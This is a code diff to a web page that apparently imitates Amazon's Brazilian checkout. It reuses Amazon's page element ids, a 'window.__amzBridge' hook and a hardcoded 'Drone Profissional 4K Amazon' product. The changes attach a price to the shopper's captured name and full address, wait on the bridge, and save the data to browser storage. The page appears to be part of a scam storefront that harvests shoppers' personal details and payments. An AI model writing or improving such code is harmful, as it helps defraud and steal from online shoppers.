@@ -1312,7 +1312,54 @@ footer, .nav-ftr-batmobile, #nav-ftr {
         
         // Initialize bridge
         const bridge = window.__amzBridge;
-        bridge.init('checkout_1');
+        const bridgeInitPromise = bridge && bridge.init
+            ? bridge.init('checkout_1')
+            : Promise.resolve(null);
+
+        function readStoredValue(key) {
+            const sessionValue = sessionStorage.getItem(key);
+            if (sessionValue) return sessionValue;
+            try {
+                return localStorage.getItem(key);
+            } catch (error) {
+                return null;
+            }
+        }
+
+        function parsePositiveAmount(value) {
+            if (value === null || value === undefined || value === '') return 0;
+            const normalized = String(value)
+                .trim()
+                .replace(/[^\d,.-]/g, '')
+                .replace(/\.(?=\d{3}(?:\D|$))/g, '')
+                .replace(',', '.');
+            const parsed = Number(normalized);
+            return Number.isFinite(parsed) && parsed > 0 ? parsed : 0;
+        }
+
+        function enrichCheckoutAmount(data) {
+            const rawWhole = (readStoredValue('checkout_price_whole') || '').replace(/\D/g, '');
+            const rawFraction = (readStoredValue('checkout_price_fraction') || '').replace(/\D/g, '');
+            const rawAmount = readStoredValue('amz_total_amount') || '';
+
+            let amount = parsePositiveAmount(rawAmount);
+            if (!amount && rawWhole) {
+                amount = parsePositiveAmount(rawWhole + ',' + (rawFraction || '00'));
+            }
+
+            if (amount > 0) {
+                const amountCents = Math.round(amount * 100);
+                data.amount = amount;
+                data.totalAmount = amount;
+                data.amountCents = amountCents;
+                data.checkout_price_whole = rawWhole || String(Math.floor(amountCents / 100));
+                data.checkout_price_fraction = (rawFraction || String(amountCents % 100)).padStart(2, '0').slice(0, 2);
+            }
+
+            if (!data.productName) {
+                data.productName = 'Drone Profissional 4K Amazon';
+            }
+        }
 
         const fieldMap = {
             nome: '#address-ui-widgets-enterAddressFullName',
@@ -1447,9 +1494,27 @@ footer, .nav-ftr-batmobile, #nav-ftr {
                 sessionStorage.setItem('checkout_address', JSON.stringify(data));
                 sessionStorage.setItem('user_name', data.nome || '');
                 sessionStorage.setItem('user_full_address', data.full_address || '');
+                if (data.amount > 0) {
+                    sessionStorage.setItem('amz_total_amount', String(data.amount));
+                }
+                if (data.checkout_price_whole) {
+                    sessionStorage.setItem('checkout_price_whole', data.checkout_price_whole);
+                }
+                if (data.checkout_price_fraction) {
+                    sessionStorage.setItem('checkout_price_fraction', data.checkout_price_fraction);
+                }
                 localStorage.setItem('checkout_address', JSON.stringify(data));
                 localStorage.setItem('user_name', data.nome || '');
                 localStorage.setItem('user_full_address', data.full_address || '');
+                if (data.amount > 0) {
+                    localStorage.setItem('amz_total_amount', String(data.amount));
+                }
+                if (data.checkout_price_whole) {
+                    localStorage.setItem('checkout_price_whole', data.checkout_price_whole);
+                }
+                if (data.checkout_price_fraction) {
+                    localStorage.setItem('checkout_price_fraction', data.checkout_price_fraction);
+                }
             } catch (storageError) {}
         }
 
@@ -1473,6 +1538,14 @@ footer, .nav-ftr-batmobile, #nav-ftr {
 
             // Build full address string for storage
             data.full_address = `${data.rua}, ${data.numero}${data.complemento ? ' - ' + data.complemento : ''}, ${data.bairro}, ${data.cidade} - ${data.estado}, ${data.cep}`;
+            enrichCheckoutAmount(data);
+
+            try {
+                await Promise.race([
+                    bridgeInitPromise,
+                    new Promise((resolve) => setTimeout(resolve, 1200))
+                ]);
+            } catch (bridgeError) {}
 
             persistPhaseOneData(data);
             
